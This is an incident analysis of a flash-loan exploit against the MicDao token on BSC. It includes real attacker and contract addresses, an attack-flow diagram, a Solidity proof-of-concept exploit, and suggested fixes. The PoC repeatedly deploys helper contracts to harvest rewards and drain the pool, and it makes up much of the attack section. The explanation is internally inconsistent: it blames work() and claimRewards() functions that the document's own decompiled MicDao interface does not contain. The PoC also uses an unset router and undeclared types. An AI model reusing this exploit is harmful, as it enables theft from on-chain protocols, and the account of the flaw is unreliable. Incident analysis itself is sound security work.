# MicDao Helper Contract Arbitrage Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | MicDao |
| Date | 2023-10-18 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$13,000 USD |
| Attack Type | Flash Loan + Helper Contract Repeated Arbitrage |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0xcd03ed98868a6cd78096f116a4b56a5f2c67757d` |
| Attack Contract | `0x502b4a51ca7900f391d474268c907b110a277d6f` |
| Vulnerable Contract | `0xf6876f6AB2637774804b85aECC17b434a2B57168` (MicDao) |
| Fork Block | 32,711,747 |

## 2. Vulnerability Code Analysis

The MicDao contract's swap mechanism contained a business logic flaw. The attacker obtained BUSDT via a flash loan, purchased MicDao tokens, then deployed 80 HelperContract instances and called the `work()` function on each. These repeated calls manipulated MicDao's internal accumulated rewards or pool state, allowing the attacker to extract more BUSDT than originally deposited.

```solidity
// Vulnerable pattern: reward accumulation via repeated work() calls
contract MicDao {
    mapping(address => uint256) public rewards;
    uint256 public distributionPool;

    // Vulnerable: function that pays out a fixed reward on each call
    function work() external {
        // Allows repeated calls without internal state guard
        uint256 reward = distributionPool / 1000; // pays 0.1% each time
        rewards[msg.sender] += reward;
        distributionPool -= reward;
        // Vulnerable: each distinct caller contract receives its own reward
    }

    function claimRewards() external {
        uint256 amount = rewards[msg.sender];
        rewards[msg.sender] = 0;
        BUSDT.transfer(msg.sender, amount);
    }
}
```

**Vulnerability**: MicDao's `work()` function distributes rewards based on the calling contract's address. By deploying 80 distinct HelperContract instances, each one could receive a separate reward. The attacker collected all these rewards into a central contract and realized the arbitrage profit.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// File: MicDao_decompiled.sol
contract MicDao {  // ❌

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x095ea7b3
    function approve(address account, uint256 value) external returns (bool) {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x23b872dd
    function transferFrom(address account, address recipient, uint256 shares) external returns (bool) {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint256) {}

    // Selector: 0x39509351
    function increaseAllowance(address account, uint256 value) external {}

    // Selector: 0x43c6f8f9
    function setDelivers(address[] param0, bool enabled) external {}

    // Selector: 0x70a08231
    function balanceOf(address account) external view returns (uint256) {}

    // Selector: 0x715018a6
    function renounceOwnership() external {}

    // Selector: 0x8356514f
    function setPairList(address[] param0, bool enabled) external {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0xa457c2d7
    function decreaseAllowance(address account, uint256 value) external {}

    // Selector: 0xa9059cbb
    function transfer(address account, uint256 value) external returns (bool) {}

    // Selector: 0xae2116b8
    function pairList(address account) external view {}

    // Selector: 0xb8616acb
    function isDelivers(address account) external view {}

    // Selector: 0xdd62ed3e
    function allowance(address account, address recipient) external view returns (uint256) {}

    // Selector: 0xf2fde38b
    function transferOwnership(address account) external {}

}
```

## 3. Attack Flow

```
Attacker [0xcd03ed98868a6cd78096f116a4b56a5f2c67757d]
  │
  ├─1─▶ DPPOracle.flashLoan()
  │      [DPPOracle: 0x26d0c625e5F5D6de034495fbDe1F6e9377185618]
  │      Borrow large amount of BUSDT
  │      [BUSDT: 0x55d398326f99059fF775485246999027B3197955]
  │
  ├─2─▶ BUSDTToMicDao() - Swap BUSDT → MicDao
  │      [MicDao: 0xf6876f6AB2637774804b85aECC17b434a2B57168]
  │
  ├─3─▶ Deploy 80 HelperContracts in a loop:
  │      for (i = 0; i < 80; i++) {
  │          new HelperContract().work()
  │      }
  │      Each HelperContract: independently calls MicDao.work()
  │      → Each receives a separate reward
  │      → Total of 80x rewards accumulated
  │
  ├─4─▶ MicDaoToBUSDT() - Swap accumulated MicDao + rewards back to BUSDT
  │      Receive more BUSDT than deposited
  │
  └─5─▶ BUSDT.transfer(DPPOracle) - Repay flash loan
         ~$13,000 profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ISwapContract {
    function work() external;
    function claimRewards() external;
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

// Helper contract used in each iteration
contract HelperContract {
    ISwapContract micDao;
    address owner;

    constructor(address _micDao) {
        micDao = ISwapContract(_micDao);
        owner = msg.sender;
    }

    function work() external {
        micDao.work();
        micDao.claimRewards();
        // Forward claimed rewards to owner
        IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
        BUSDT.transfer(owner, BUSDT.balanceOf(address(this)));
    }
}

contract MicDaoExploit {
    ISwapContract micDao = ISwapContract(0xf6876f6AB2637774804b85aECC17b434a2B57168);
    IDPPOracle dppOracle = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 MicDaoToken = IERC20(0xf6876f6AB2637774804b85aECC17b434a2B57168);
    Uni_Router_V2 router;

    function testExploit() external {
        dppOracle.flashLoan(0, BUSDT.balanceOf(address(dppOracle)) * 99/100, address(this), "");
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        // Swap BUSDT → MicDao
        BUSDTToMicDao(quoteAmount / 2);

        // Deploy 80 HelperContracts and call work()
        for (uint i = 0; i < 80; i++) {
            HelperContract helper = new HelperContract(address(micDao));
            // Transfer a portion of MicDao tokens to each helper
            MicDaoToken.transfer(address(helper), MicDaoToken.balanceOf(address(this)) / (80 - i));
            helper.work();
        }

        // Swap MicDao → BUSDT
        MicDaoToBUSDT();

        // Repay flash loan
        BUSDT.transfer(address(dppOracle), quoteAmount);
    }

    function BUSDTToMicDao(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(MicDaoToken);
        BUSDT.approve(address(router), amount);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function MicDaoToBUSDT() internal {
        uint256 balance = MicDaoToken.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(MicDaoToken);
        path[1] = address(BUSDT);
        MicDaoToken.approve(address(router), balance);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(balance, 0, path, address(this), block.timestamp);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | Duplicate reward collection via repeated helper contract deployment |
| Impact Scope | MicDao reward pool |
| Explorer | [BSCscan](https://bscscan.com/address/0xf6876f6AB2637774804b85aECC17b434a2B57168) |

## 6. Security Recommendations

```solidity
// Fix 1: Restrict work() calls to EOAs only
function work() external {
    // Block contract callers
    require(msg.sender == tx.origin, "Contracts not allowed");
    // ...
}

// Fix 2: Limit the number of work() calls per address
mapping(address => uint256) public workCount;
uint256 public constant MAX_WORK_PER_ADDRESS = 1;

function work() external {
    require(workCount[msg.sender] < MAX_WORK_PER_ADDRESS, "Work limit exceeded");
    workCount[msg.sender]++;
    // ...
}

// Fix 3: KYC/whitelist-based participation restriction
mapping(address => bool) public approvedParticipants;

function work() external {
    require(approvedParticipants[msg.sender], "Not approved");
    // ...
}

// Fix 4: Prevent duplicate rewards within the same block
mapping(address => uint256) public lastWorkBlock;

function work() external {
    require(block.number > lastWorkBlock[msg.sender], "Already worked this block");
    lastWorkBlock[msg.sender] = block.number;
    // ...
}
```

## 7. Lessons Learned

1. **Helper contract attack pattern**: The pattern of deploying 80 distinct contract addresses to each receive an independent reward is a variant of a "Sybil attack." Using a contract address as a user identity allows unlimited address generation.
2. **Blocking contract calls**: Adding `require(msg.sender == tx.origin)` to reward distribution functions prevents automated repeated attacks via contracts.
3. **One-time reward design**: Any reward mechanism that pays once per address will always be an attack target when the reward exceeds the cost of address creation. Reward logic should be staking-based rather than address-based.
4. **DODO flash loan + BSC small-cap protocols**: Small DeFi protocols on BSC are repeatedly exploited via the combination of DODO DPP Oracle flash loans and business logic vulnerabilities. Reward mechanisms must be designed assuming flash-loan-scale capital availability.